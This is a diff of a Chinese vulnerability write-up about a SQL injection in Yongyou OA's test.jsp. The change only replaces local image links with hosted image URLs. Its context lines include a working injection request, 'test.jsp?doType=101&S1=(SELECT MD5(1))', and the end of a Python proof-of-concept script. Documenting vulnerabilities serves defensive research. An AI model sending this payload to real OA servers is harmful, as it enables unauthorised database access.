@@ -26,7 +26,7 @@
 
 登录页面如下
 
-![](image/yongyou-11.png)
+![](http://wikioss.peiqi.tech/vuln/yongyou-11.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 POC
 
@@ -34,7 +34,7 @@ POC
 /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))
 ```
 
-![](image/yongyou-12.png)
+![](http://wikioss.peiqi.tech/vuln/yongyou-12.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 利用方法与致远OA 的SQL注入类似
 
@@ -78,4 +78,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/yongyou-16.png)
+![](http://wikioss.peiqi.tech/vuln/yongyou-16.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
